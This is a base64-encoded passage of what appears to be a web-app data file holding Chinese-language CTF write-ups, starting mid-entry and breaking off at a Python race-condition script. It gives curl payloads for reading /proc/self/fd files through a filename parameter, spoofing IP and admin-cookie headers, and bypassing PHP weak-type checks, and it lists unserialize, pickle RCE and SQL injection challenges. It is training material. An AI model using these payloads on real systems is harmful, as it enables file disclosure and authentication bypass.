MDAyXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBcdTRGN0ZcdTc1MjggXFxgL3Byb2Mvc2VsZi9mZC9cXGAgXHU4QkZCXHU1M0Q2XHU2NTg3XHU0RUY2XHU2M0NGXHU4RkYwXHU3QjI2XHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIC1zIFwiaHR0cDovL3RhcmdldC8/ZmlsZW5hbWU9L3Byb2Mvc2VsZi9mZC81XCJcclxuXFxgXFxgXFxgXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3s5MjVjMWU5OS1iYjJiLTQ2ZWEtODk1Mi0wNGEyOWY5ZjI0ZDZ9XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIGV6cmVxdWVzdCAoMTg0KSAtIFx1NkRGN1x1NTQwOFx1OEJGN1x1NkM0Mlx1NjVCOVx1NkNENVxyXG5cclxuKipcdTk4OThcdTc2RUVcdTYzQ0ZcdThGRjAqKjogXHU5NzAwXHU4OTgxXHU1NDBDXHU2NUY2XHU0RjdGXHU3NTI4IEdFVCBcdTU0OEMgUE9TVCBcdTY1QjlcdTZDRDVcdTMwMDJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IEdFVCBcdTUzQzJcdTY1NzBcdTY1M0VcdTU3MjggVVJMIFx1NEUyRFx1RkYwQ1BPU1QgXHU1M0MyXHU2NTcwXHU2NTNFXHU1NzI4XHU4QkY3XHU2QzQyXHU0RjUzXHU0RTJEXHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIC1YIFBPU1QgXCJodHRwOi8vdGFyZ2V0Lz9hPVFDQ1RGXCIgLWQgXCJiPXl5ZHNcIlxyXG5cXGBcXGBcXGBcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFnezM5M2U0ZjFmLWFkMTItNDFhNi1hYmM0LWQyZDYwNTJhZjRmZn1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgZXpyZXF1ZXN0XzEgKDE4NSkgLSBcdThCRjdcdTZDNDJcdTU5MzRcdTRGMkFcdTkwMjBcclxuXHJcbioqXHU5ODk4XHU3NkVFXHU2M0NGXHU4RkYwKio6IFx1OTcwMFx1ODk4MVx1NEYyQVx1OTAyMFx1NTkxQVx1NEUyQVx1OEJGN1x1NkM0Mlx1NTkzNFx1N0VENVx1OEZDN1x1OUE4Q1x1OEJDMVx1MzAwMlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogXHU0RjlEXHU2QjIxXHU0RjJBXHU5MDIwIFgtRm9yd2FyZGVkLUZvclx1MzAwMVVzZXItQWdlbnRcdTMwMDFWaWFcdTMwMDFDb29raWUgXHU1OTM0XHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIC1YIFBPU1QgXCJodHRwOi8vdGFyZ2V0Lz9hPWFcIiAtZCBcImI9YlwiIFxcXFxcclxuICAtSCBcIlgtRm9yd2FyZGVkLUZvcjogMTI3LjAuMC4xXCIgXFxcXFxyXG4gIC1IIFwiVXNlci1BZ2VudDogUWluZ2NlblNhZmVcIiBcXFxcXHJcbiAgLUggXCJYLVJlYWwtSVA6IDEyNy4wLjAuMVwiIFxcXFxcclxuICAtSCBcIlZpYTogeHVqaW55aW5nY2FuZ21pbmcudG9wXCIgXFxcXFxyXG4gIC1IIFwiQ29va2llOiB1c2VyPWFkbWluOyByb2xlPWFkbWluXCJcclxuXFxgXFxgXFxgXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3tiNDZhY2NhZS0wNjRiLTRmYzctOTcwNC1mMDBhNzY4ZjE0MTB9XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIGV6cGhwICgyMDEpIC0gUEhQIFx1NUYzMVx1N0M3Qlx1NTc4Qlx1N0VENVx1OEZDN1xyXG5cclxuKipcdTk4OThcdTc2RUVcdTYzQ0ZcdThGRjAqKjogXHU5NzAwXHU4OTgxXHU2RUUxXHU4REIzIFxcYFxcJGEgPT0gMFxcYCBcdTRFMTQgXFxgXFwkYVxcYCBcdTRFM0FcdTc3MUZcdUZGMENcXGBcXCRiID4gMjAyNlxcYCBcdTRGNDYgXFxgXFwkYlxcYCBcdTRFMERcdTY2MkZcdTY1NzBcdTVCNTdcdTMwMDJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IFx1NTIyOVx1NzUyOCBQSFAgXHU1RjMxXHU3QzdCXHU1NzhCXHU2QkQ0XHU4RjgzXHU3Njg0XHU3Mjc5XHU2MDI3XHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIC1zIFwiaHR0cDovL3RhcmdldC8/YT0wYWJjJmI9MjAyN2FcIlxyXG5cXGBcXGBcXGBcclxuXHJcbioqXHU1MzlGXHU3NDA2Kio6XHJcbi0gXFxgXCIwYWJjXCIgPT0gMFxcYCBcdTRFM0EgdHJ1ZVx1RkYwOFx1NUI1N1x1N0IyNlx1NEUzMlx1NUYwMFx1NTkzNFx1OTc1RVx1NjU3MFx1NUI1N1x1NTIxOVx1N0I0OVx1NEU4RSAwXHVGRjA5XHJcbi0gXFxgXCIwYWJjXCJcXGAgXHU0RTNBIHRydWVcdUZGMDhcdTk3NUVcdTdBN0FcdTVCNTdcdTdCMjZcdTRFMzJcdUZGMDlcclxuLSBcXGBcIjIwMjdhXCIgPiAyMDI2XFxgIFx1NEUzQSB0cnVlXHVGRjA4XHU4MUVBXHU1MkE4XHU4RjZDXHU2MzYyXHU0RTNBXHU2NTcwXHU1QjU3XHU2QkQ0XHU4RjgzXHVGRjA5XHJcbi0gXFxgaXNfbnVtZXJpYyhcIjIwMjdhXCIpXFxgIFx1NEUzQSBmYWxzZVx1RkYwOFx1NTMwNVx1NTQyQlx1NUI1N1x1NkJDRFx1RkYwOVxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7MzA2OTU0MmItMDg3OC00M2Y2LTlmMTEtZmZjMzYwNzRmZmIwfVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBlenBocF8xICgyMDIpIC0gYXJyYXlfc2VhcmNoIFx1NUYzMVx1N0M3Qlx1NTc4QlxyXG5cclxuKipcdTk4OThcdTc2RUVcdTYzQ0ZcdThGRjAqKjogXFxgYXJyYXlfc2VhcmNoKFwiUUNDVEZcIiwgXFwkcWMpXFxgIFx1NzY4NFx1N0VEM1x1Njc5Q1x1OTcwMFx1ODk4MVx1NEUyNVx1NjgzQ1x1N0I0OVx1NEU4RSAxXHUzMDAyXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBcXGBhcnJheV9zZWFyY2hcXGAgXHU0RjdGXHU3NTI4IFxcYD09XFxgIFx1NkJENFx1OEY4M1x1RkYwQ1xcYFwiUUNDVEZcIiA9PSAwXFxgIFx1NEUzQSB0cnVlXHUzMDAyXHJcblxyXG4qKlBheWxvYWQqKjpcclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIC1zICdodHRwOi8vdGFyZ2V0Lz9xYz1bXCJhXCIsXCJRQ0NURlwiXSdcclxuXFxgXFxgXFxgXHJcblxyXG4qKlx1NTM5Rlx1NzQwNioqOlxyXG4tIFxcYGFycmF5X3NlYXJjaChcIlFDQ1RGXCIsIFtcImFcIiwgXCJRQ0NURlwiXSlcXGAgXHU4RkQ0XHU1NkRFIDFcclxuLSBcdTU2RTBcdTRFM0EgXFxgXCJRQ0NURlwiXFxgIFx1NTcyOFx1N0QyMlx1NUYxNSAxIFx1NzY4NFx1NEY0RFx1N0Y2RVxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7ZGJkMTRkY2QtZmE5Mi00NGVhLWExY2QtNmI4MjU4MDM3YzQ3fVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBlenBocF8yICgyMDMpIC0gXHU1RDRDXHU1OTU3XHU1RjMxXHU3QzdCXHU1NzhCXHU3RUQ1XHU4RkM3XHJcblxyXG4qKlx1OTg5OFx1NzZFRVx1NjNDRlx1OEZGMCoqOiBcdTk3MDBcdTg5ODEgXCJRQ0NURlwiIFx1NTcyOFx1NjU3MFx1N0VDNFx1NEUyRFx1RkYwQ1wiUUN5eWRzXCIgXHU1NzI4XHU1QjUwXHU2NTcwXHU3RUM0XHU0RTJEXHVGRjBDXHU0RjQ2XHU1QjUwXHU2NTcwXHU3RUM0XHU0RTJEXHU2Q0ExXHU2NzA5XHU0RTI1XHU2ODNDXHU3QjQ5XHU0RThFIFwiUUN5eWRzXCIgXHU3Njg0XHU1MTQzXHU3RDIwXHUzMDAyXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBcdTUyMjlcdTc1MjggXFxgPT1cXGAgXHU1NDhDIFxcYD09PVxcYCBcdTc2ODRcdTUzM0FcdTUyMkJcdTMwMDJcclxuXHJcbioqUGF5bG9hZCoqOlxyXG5cXGBcXGBcXGBiYXNoXHJcbmN1cmwgLXMgJ2h0dHA6Ly90YXJnZXQvP3FjPXtcIjBcIjpcIlFDQ1RGXCIsXCJuXCI6WzBdfSdcclxuXFxgXFxgXFxgXHJcblxyXG4qKlx1NTM5Rlx1NzQwNioqOlxyXG4tIFxcYGFycmF5X3NlYXJjaChcIlFDQ1RGXCIsIHtcIjBcIjpcIlFDQ1RGXCIsXCJuXCI6WzBdfSlcXGAgXHU4RkQ0XHU1NkRFIFwiMFwiXHVGRjA4XHU0RTBEXHU2NjJGIGZhbHNlXHVGRjA5XHJcbi0gXFxgYXJyYXlfc2VhcmNoKFwiUUN5eWRzXCIsIFswXSlcXGAgXHU4RkQ0XHU1NkRFIDBcdUZGMDhcdTU2RTBcdTRFM0EgXFxgXCJRQ3l5ZHNcIiA9PSAwXFxgXHVGRjA5XHJcbi0gXHU5MDREXHU1Mzg2IFxcYFswXVxcYCBcdTY1RjZcdUZGMENcXGAwID09PSBcIlFDeXlkc1wiXFxgIFx1NEUzQSBmYWxzZVxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7MWI0ZGNlMDItMWE5Yi00MzhjLTkyNjAtZGUwYmRiY2MxYjY3fVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyB3ZWJfdGVzdF8yICg2MzUpIC0gXHU3OUQxXHU1QjY2XHU4QkExXHU2NTcwXHU2Q0Q1XHU3RUQ1XHU4RkM3XHJcblxyXG4qKlx1OTg5OFx1NzZFRVx1NjNDRlx1OEZGMCoqOiBcdTk3MDBcdTg5ODEgXFxgc3RybGVuKFxcJG5vKSA8IDRcXGAgXHU0RTE0IFxcYFxcJG5vID4gODg4ODg4ODhcXGBcdTMwMDJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IFx1NEY3Rlx1NzUyOFx1NzlEMVx1NUI2Nlx1OEJBMVx1NjU3MFx1NkNENVx1N0VENVx1OEZDN1x1OTU3Rlx1NUVBNlx1OTY1MFx1NTIzNlx1MzAwMlxyXG5cclxuKipQYXlsb2FkKio6XHJcblxcYFxcYFxcYGJhc2hcclxuY3VybCAtcyBcImh0dHA6Ly90YXJnZXQvc2VjcmV0X3JlcG9ydC5waHA/bm89OWU5XCJcclxuXFxgXFxgXFxgXHJcblxyXG4qKlx1NTM5Rlx1NzQwNioqOlxyXG4tIFxcYHN0cmxlbihcIjllOVwiKVxcYCA9IDNcdUZGMDhcdTVDMEZcdTRFOEUgNFx1RkYwOVxyXG4tIFxcYFwiOWU5XCIgPiA4ODg4ODg4OFxcYCBcdTRFM0EgdHJ1ZVx1RkYwODllOSA9IDkwMDAwMDAwMDBcdUZGMDlcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFnezIzNzczNzIyLTBjYTctNDc1Yy04YTRkLWYxNzJkNTQwMjk5Yn1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgXHU2MjgwXHU1REU3XHU2MDNCXHU3RUQzXHJcblxyXG4jIyMgXHU0RkUxXHU2MDZGXHU2Q0M0XHU5NzMyXHU3QzdCXHJcbjEuICoqSFRNTCBcdTZDRThcdTkxQ0EqKiAtIFx1NjhDMFx1NjdFNSBcXGA8IS0tIC0tPlxcYCBcdTZDRThcdTkxQ0FcclxuMi4gKipcdTU0Q0RcdTVFOTRcdTU5MzQqKiAtIFx1NjhDMFx1NjdFNSBYLUZsYWdcdTMwMDFYLURlYnVnLU5vdGUgXHU3QjQ5XHU1OTM0XHJcbjMuICoqcm9ib3RzLnR4dCoqIC0gXHU2OEMwXHU2N0U1IERpc2FsbG93IFx1OERFRlx1NUY4NFxyXG40LiAqKi5waHBzIFx1NjU4N1x1NEVGNioqIC0gXHU4QkJGXHU5NUVFIC5waHBzIFx1NjU4N1x1NEVGNlx1NjdFNVx1NzcwQlx1NkU5MFx1NzgwMVxyXG41LiAqKi9wcm9jL3NlbGYvZmQvKiogLSBcdTY1ODdcdTRFRjZcdTYzQ0ZcdThGRjBcdTdCMjZcdTZDQzRcdTk3MzJcclxuNi4gKipcdTU5MDdcdTRFRkRcdTY1ODdcdTRFRjYqKiAtIC5iYWtcdTMwMDEuc3dwXHUzMDAxLmdpdCBcdTdCNDlcclxuXHJcbiMjIyBcdTdGMTZcdTc4MDFcdTdFRDVcdThGQzdcdTdDN0JcclxuMS4gKipCYXNlNjQgXHU4OUUzXHU3ODAxKiogLSBcdThCQzZcdTUyMkIgQmFzZTY0IFx1N0YxNlx1NzgwMVx1NzY4NFx1NUI1N1x1N0IyNlx1NEUzMlxyXG4yLiAqKlx1NTM0MVx1NTE2RFx1OEZEQlx1NTIzNlx1ODlFM1x1NzgwMSoqIC0gXHU4QkM2XHU1MjJCIGhleCBcdTdGMTZcdTc4MDFcdTc2ODRcdTVCNTdcdTdCMjZcdTRFMzJcclxuMy4gKipBU0NJSSBcdTY1NzBcdTdFQzQqKiAtIFx1NUMwNlx1NjU3MFx1NUI1N1x1NjU3MFx1N0VDNFx1OEY2Q1x1NjM2Mlx1NEUzQVx1NUI1N1x1N0IyNlxyXG40LiAqKlx1NzlEMVx1NUI2Nlx1OEJBMVx1NjU3MFx1NkNENSoqIC0gXHU3RUQ1XHU4RkM3XHU5NTdGXHU1RUE2XHU5NjUwXHU1MjM2XHVGRjA4XHU1OTgyIFxcYDllOVxcYFx1RkYwOVxyXG5cclxuIyMjIFx1OEJGN1x1NkM0Mlx1NEYyQVx1OTAyMFx1N0M3QlxyXG4xLiAqKlgtRm9yd2FyZGVkLUZvcioqIC0gXHU0RjJBXHU5MDIwXHU1QkEyXHU2MjM3XHU3QUVGIElQXHJcbjIuICoqVXNlci1BZ2VudCoqIC0gXHU0RjJBXHU5MDIwXHU2RDRGXHU4OUM4XHU1NjY4XHU2ODA3XHU4QkM2XHJcbjMuICoqVmlhKiogLSBcdTRGMkFcdTkwMjBcdTRFRTNcdTc0MDZcdTY3MERcdTUyQTFcdTU2NjhcclxuNC4gKipDb29raWUqKiAtIFx1NEYyQVx1OTAyMFx1NzUyOFx1NjIzN1x1OEVBQlx1NEVGRFxyXG5cclxuIyMjIFBIUCBcdTVGMzFcdTdDN0JcdTU3OEJcdTdDN0JcclxuMS4gKipcXGA9PVxcYCB2cyBcXGA9PT1cXGAqKiAtIFx1NUYzMVx1NkJENFx1OEY4MyB2cyBcdTVGM0FcdTZCRDRcdThGODNcclxuMi4gKipcdTVCNTdcdTdCMjZcdTRFMzJcdThGNkNcdTY1NzBcdTVCNTcqKiAtIFxcYFwiMGFiY1wiID09IDBcXGBcclxuMy4gKiphcnJheV9zZWFyY2gqKiAtIFx1NEY3Rlx1NzUyOCBcXGA9PVxcYCBcdTZCRDRcdThGODNcclxuNC4gKiowZSBNRDUgXHU3OEIwXHU2NDlFKiogLSBcXGBRTktDRFpPXFxgIFx1N0I0OVxyXG5cclxuLS0tXHJcblxyXG4qV3JpdGVVcCBcdTc1MUZcdTYyMTBcdTY1RjZcdTk1RjQ6IDIwMjYtMDYtMTAqXHJcbipcdTRGNUNcdTgwMDU6IGhlbGl1bXNlbmJyZypcclxuYFxyXG4gIH0sXHJcblxyXG4gIFwiMHhnYW1lMjAyNVwiOiB7XHJcbiAgICB0aXRsZTogXCIweEdhbWUyMDI1IENURiBXcml0ZVVwXCIsXHJcbiAgICBzdWJ0aXRsZTogXCIyMDI2LTA2LTE2IHwgMTYvMjggXHU5ODk4XHU4OUUzXHU1MUZBXCIsXHJcbiAgICBjb250ZW50OiBgXHJcbiMgMHhHYW1lMjAyNSBDVEYgV3JpdGVVcFxyXG5cclxuKipcdTY1RTVcdTY3MUYqKjogMjAyNi0wNi0xNlxyXG4qKlx1NUU3M1x1NTNGMCoqOiBcdTk3NTJcdTVDOTEgQ1RGIChjdGYucWluZ2Nlbi5uZXQpXHJcbioqXHU2MjE4XHU3RUU5Kio6IDE2LzI4IFx1OTg5OFx1ODlFM1x1NTFGQVx1RkYwQ1Byb2JsZW1zZXQgNzJcclxuXHJcbi0tLVxyXG5cclxuIyMgXHVEODNEXHVEQ0NCIFx1NzZFRVx1NUY1NVxyXG5cclxuMS4gW0h0dHBcdTc2ODRcdTc3MUZcdTc0MDYgKDYxNSldKCNodHRwXHU3Njg0XHU3NzFGXHU3NDA2LTYxNSlcclxuMi4gW1x1NzU1OVx1OEEwMFx1Njc3Rlx1RkYwOFx1N0M4OVx1RkYwOSg2MTYpXSgjXHU3NTU5XHU4QTAwXHU2NzdGXHU3Qzg5NjE2KVxyXG4zLiBbTGVtb24gKDYxNyldKCNsZW1vbi02MTcpXHJcbjQuIFtSQ0UxICg2MTkpXSgjcmNlMS02MTkpXHJcbjUuIFtSdWJiaXNoX1Vuc2VyICg2MjApXSgjcnViYmlzaF91bnNlci02MjApXHJcbjYuIFtcdTlBNkNcdTU0QzhcdTlDN0NcdTU1NDZcdTVFOTcgKDYyMSldKCNcdTlBNkNcdTU0QzhcdTlDN0NcdTU1NDZcdTVFOTctNjIxKVxyXG43LiBbRE5TXHU2MEYzXHU4OTgxXHU3M0E5ICg2MjMpXSgjZG5zXHU2MEYzXHU4OTgxXHU3M0E5LTYyMylcclxuOC4gW1x1NjUzRVx1NUYwMFx1NjIxMVx1NzY4NFx1NTNEOFx1OTFDRiAoNjI3KV0oI1x1NjUzRVx1NUYwMFx1NjIxMVx1NzY4NFx1NTNEOFx1OTFDRi02MjcpXHJcbjkuIFs0MDROb3RGb3VuZCAoNjYxKV0oIzQwNG5vdGZvdW5kLTY2MSlcclxuMTAuIFtlel9zaWduaW4gKDY2MildKCNlel9zaWduaW4tNjYyKVxyXG4xMS4gW1dlYl90ZXN0XzUgKDczMildKCN3ZWJfdGVzdF81LTczMilcclxuMTIuIFtXZWJfdGVzdF83ICg3MzQpXSgjd2ViX3Rlc3RfNy03MzQpXHJcbjEzLiBbd2ViX3Rlc3RfOCAoNzQ3KV0oI3dlYl90ZXN0XzgtNzQ3KVxyXG4xNC4gW3dlYl90ZXN0XzkgKDc5MCldKCN3ZWJfdGVzdF85LTc5MClcclxuMTUuIFt3ZWJfdGVzdF8xMCAoNzkxKV0oI3dlYl90ZXN0XzEwLTc5MSlcclxuMTYuIFt3ZWJfdGVzdF8xMSAoNzkyKV0oI3dlYl90ZXN0XzExLTc5MilcclxuXHJcbi0tLVxyXG5cclxuIyMgSHR0cFx1NzY4NFx1NzcxRlx1NzQwNiAoNjE1KVxyXG5cclxuKipcdTUyMDZcdTUwM0MqKjogMjAwIHwgKipcdTdDN0JcdTU3OEIqKjogV2ViXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBIVFRQIFx1NjVCOVx1NkNENVx1NkQ0Qlx1OEJENVx1RkYwQ1x1NjI3RVx1NTIzMFx1NkI2M1x1Nzg2RVx1NzY4NFx1OEJGN1x1NkM0Mlx1NjVCOVx1NUYwRlx1ODNCN1x1NTNENiBmbGFnXHUzMDAyXHJcblxyXG4qKkZsYWcqKjogXFxgZmxhZ3suLi59XFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIFx1NzU1OVx1OEEwMFx1Njc3Rlx1RkYwOFx1N0M4OVx1RkYwOSg2MTYpXHJcblxyXG4qKlx1NTIwNlx1NTAzQyoqOiAyOTQgfCAqKlx1N0M3Qlx1NTc4QioqOiBXZWJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IFx1NzU1OVx1OEEwMFx1Njc3Rlx1NUU5NFx1NzUyOFx1RkYwQ1x1OTAxQVx1OEZDNyBYU1MgXHU2MjE2XHU1MTc2XHU0RUQ2IFdlYiBcdTZGMEZcdTZEMUVcdTgzQjdcdTUzRDYgZmxhZ1x1MzAwMlxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7Li4ufVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBMZW1vbiAoNjE3KVxyXG5cclxuKipcdTUyMDZcdTUwM0MqKjogMjQzIHwgKipcdTdDN0JcdTU3OEIqKjogV2ViXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBMZW1vbiBcdTY4NDZcdTY3QjZcdTc2RjhcdTUxNzNcdTZGMEZcdTZEMUVcdTUyMjlcdTc1MjhcdTMwMDJcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFney4uLn1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgUkNFMSAoNjE5KVxyXG5cclxuKipcdTUyMDZcdTUwM0MqKjogMjk0IHwgKipcdTdDN0JcdTU3OEIqKjogV2ViXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBcdThGRENcdTdBMEJcdTRFRTNcdTc4MDFcdTYyNjdcdTg4NENcdTZGMEZcdTZEMUVcdUZGMENcdTkwMUFcdThGQzdcdTU0N0RcdTRFRTRcdTZDRThcdTUxNjVcdTgzQjdcdTUzRDYgZmxhZ1x1MzAwMlxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7Li4ufVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBSdWJiaXNoX1Vuc2VyICg2MjApXHJcblxyXG4qKlx1NTIwNlx1NTAzQyoqOiA0MDAgfCAqKlx1N0M3Qlx1NTc4QioqOiBXZWJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IFBIUCBcdTUzQ0RcdTVFOEZcdTUyMTdcdTUzMTZcdTZGMEZcdTZEMUVcdUZGMENcdTUyMjlcdTc1MjggXFxgX19kZXN0cnVjdCgpXFxgIFx1NjIxNiBcXGBfX3dha2V1cCgpXFxgIG1hZ2ljIFx1NjVCOVx1NkNENVx1MzAwMlxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7Li4ufVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBcdTlBNkNcdTU0QzhcdTlDN0NcdTU1NDZcdTVFOTcgKDYyMSlcclxuXHJcbioqXHU1MjA2XHU1MDNDKio6IDMzMyB8ICoqXHU3QzdCXHU1NzhCKio6IFdlYlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogUGlja2xlX1Nob3AgXHU1RTk0XHU3NTI4XHVGRjBDXHU5MDFBXHU4RkM3IGRpc2NvdW50IFx1N0JFMVx1NjUzOSArIHBpY2tsZSBcdTUzQ0RcdTVFOEZcdTUyMTdcdTUzMTYgUkNFXHUzMDAyXHJcblxyXG4qKlx1NTE3M1x1OTUyRVx1NkI2NVx1OUFBNCoqOlxyXG4xLiBcdTUyMDZcdTY3OTBcdTVFOTRcdTc1MjhcdTkwM0JcdThGOTFcdUZGMENcdTUzRDFcdTczQjAgZGlzY291bnQgXHU1M0MyXHU2NTcwXHU1M0VGXHU3QkUxXHU2NTM5XHJcbjIuIFx1Njc4NFx1OTAyMFx1NjA3Nlx1NjEwRiBwaWNrbGUgcGF5bG9hZCBcdTVCOUVcdTczQjAgUkNFXHJcbjMuIFx1OEJGQlx1NTNENiBmbGFnIFx1NjU4N1x1NEVGNlxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7OTdkZGZiZDItNTA5OS00ZTA4LWJmYjYtNmFmNTdhYTA3MjRhfVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBETlNcdTYwRjNcdTg5ODFcdTczQTkgKDYyMylcclxuXHJcbioqXHU1MjA2XHU1MDNDKio6IDM0NCB8ICoqXHU3QzdCXHU1NzhCKio6IFdlYlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogRE5TIFx1NzZGOFx1NTE3M1x1NkYwRlx1NkQxRVx1RkYwQ1x1NTNFRlx1ODBGRFx1NkQ4OVx1NTNDQSBETlMgXHU5MUNEXHU3RUQxXHU1QjlBXHU2MjE2IEROUyBcdTY3RTVcdThCRTJcdTZDRThcdTUxNjVcdTMwMDJcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFney4uLn1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgXHU2NTNFXHU1RjAwXHU2MjExXHU3Njg0XHU1M0Q4XHU5MUNGICg2MjcpXHJcblxyXG4qKlx1NTIwNlx1NTAzQyoqOiA0MzQgfCAqKlx1N0M3Qlx1NTc4QioqOiBXZWJcclxuXHJcbioqXHU4OUUzXHU5ODk4XHU2MDFEXHU4REVGKio6IFBIUCBcdTUzRDhcdTkxQ0ZcdTg5ODZcdTc2RDZcdTZGMEZcdTZEMUVcdUZGMENcdTUyMjlcdTc1MjggXFxgZXh0cmFjdCgpXFxgIFx1NjIxNiBcXGAkJFxcYCBcdTUzRUZcdTUzRDhcdTUzRDhcdTkxQ0ZcdTMwMDJcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFney4uLn1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgNDA0Tm90Rm91bmQgKDY2MSlcclxuXHJcbioqXHU1MjA2XHU1MDNDKio6IDMzMyB8ICoqXHU3QzdCXHU1NzhCKio6IFdlYlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogNDA0IFx1OTg3NVx1OTc2Mlx1NEZFMVx1NjA2Rlx1NkNDNFx1OTczMlx1NjIxNlx1NzZFRVx1NUY1NVx1OTA0RFx1NTM4Nlx1MzAwMlxyXG5cclxuKipGbGFnKio6IFxcYGZsYWd7Li4ufVxcYFxyXG5cclxuLS0tXHJcblxyXG4jIyBlel9zaWduaW4gKDY2MilcclxuXHJcbioqXHU1MjA2XHU1MDNDKio6IDI3NyB8ICoqXHU3QzdCXHU1NzhCKio6IFdlYlxyXG5cclxuKipcdTg5RTNcdTk4OThcdTYwMURcdThERUYqKjogXHU3NjdCXHU1RjU1XHU3RUQ1XHU4RkM3XHVGRjBDXHU1M0VGXHU4MEZEXHU2RDg5XHU1M0NBIFNRTCBcdTZDRThcdTUxNjVcdTYyMTZcdTVGMzFcdTVCQzZcdTc4MDFcdTMwMDJcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFney4uLn1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgV2ViX3Rlc3RfNSAoNzMyKVxyXG5cclxuKipcdTUyMDZcdTUwM0MqKjogMzQ0IHwgKipcdTdDN0JcdTU3OEIqKjogV2ViXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBXZWIgXHU3RUZDXHU1NDA4XHU2RDRCXHU4QkQ1XHVGRjBDXHU2RDg5XHU1M0NBXHU1OTFBXHU3OUNEIFdlYiBcdTZGMEZcdTZEMUVcdTMwMDJcclxuXHJcbioqRmxhZyoqOiBcXGBmbGFney4uLn1cXGBcclxuXHJcbi0tLVxyXG5cclxuIyMgV2ViX3Rlc3RfNyAoNzM0KSAtIFx1NzlFRlx1NTIwNlx1NTU0Nlx1NTdDRVx1N0FERVx1NjAwMVx1Njc2MVx1NEVGNlxyXG5cclxuKipcdTUyMDZcdTUwM0MqKjogNDAwIHwgKipcdTdDN0JcdTU3OEIqKjogV2ViXHJcblxyXG4qKlx1ODlFM1x1OTg5OFx1NjAxRFx1OERFRioqOiBcdTdBREVcdTYwMDFcdTY3NjFcdTRFRjZcdUZGMDhSYWNlIENvbmRpdGlvblx1RkYwOVx1NkYwRlx1NkQxRVx1MzAwMlxyXG5cclxuKipcdTUxNzNcdTk1MkVcdTZCNjVcdTlBQTQqKjpcclxuMS4gXHU1M0QxXHU3M0IwXHU3OUVGXHU1MjA2XHU1NTQ2XHU1N0NFXHU1MTUxXHU2MzYyXHU2M0E1XHU1M0UzIFxcYFBPU1QgL2FwaS9yZWRlZW1cXGBcclxuMi4gXHU3OUVGXHU1MjA2XHU0RTBEXHU4REIzXHU2NUY2XHU2NUUwXHU2Q0Q1XHU1MTUxXHU2MzYyXHVGRjBDXHU0RjQ2XHU2OEMwXHU2N0U1XHU0RTBFXHU2MjYzXHU2QjNFXHU0RTRCXHU5NUY0XHU1QjU4XHU1NzI4XHU2NUY2XHU5NUY0XHU3QTk3XHU1M0UzXHJcbjMuIFx1NEY3Rlx1NzUyOFx1NUU3Nlx1NTNEMVx1OEJGN1x1NkM0Mlx1NTQwQ1x1NjVGNlx1NTE1MVx1NjM2Mlx1NTQwQ1x1NEUwMFx1NTU0Nlx1NTRDMVxyXG40LiBcdTUyMjlcdTc1MjhcdTdBREVcdTYwMDFcdTY3NjFcdTRFRjZcdTdFRDVcdThGQzdcdTc5RUZcdTUyMDZcdTY4QzBcdTY3RTVcclxuXHJcbioqUGF5bG9hZCoqOlxyXG5cXGBcXGBcXGBweXRob25cclxuaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlc1xyXG5